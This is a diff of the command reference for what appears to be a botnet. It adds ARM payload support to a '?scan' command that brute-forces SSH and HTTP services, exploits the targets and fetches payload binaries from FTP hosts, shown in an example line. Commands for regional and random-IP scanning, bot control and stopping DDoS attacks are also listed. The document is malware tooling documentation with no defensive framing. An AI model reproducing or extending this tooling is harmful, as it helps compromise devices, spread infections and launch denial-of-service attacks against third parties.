@@ -26,17 +26,17 @@ ATTACK VECTORS:
 
 SCAN FUNCTION:
 		
-	# Example: ?scan -r ftp://192.168.40.14/bin/payload_x32 ftp://192.168.40.14/bin/payload_mips_x32
+	# Example: ?scan -r ftp://1.2.3.4/bin/payload_x32 ftp://5.6.7.8/bin/payload_mips_x32 ftp://4.3.2.1/bin/payload_arm_x32
 		
-	?scan <network> <default> <mips>		Scan default SSH and HTTP port on the network, brute-force attack, and exploit the target.
+	?scan <network> <default> <mips> <arm>		Scan default SSH and HTTP port on the network, brute-force attack, and exploit the target.
 
-		-cn		Scan on china network.
-		-hk		Scan on hong kong network.
+		-cn		Scan on China network.
+		-hk		Scan on Hong Kong network.
 		-kr		Scan on south korea network.
 		-br		Scan on brazil network.
 		-r		Scan with random IPs.
 		
-?update <default> <mips>                Update the bot source code or adapt it as a service.
+?update <default> <mips> <arm>          Update the bot source code or adapt it as a service.
 ?info				        Get bot system information, for bot analysis, etc.
 ?kill				        Bot self-close.
 ?stopddos 			        Stop DDoS attacking.
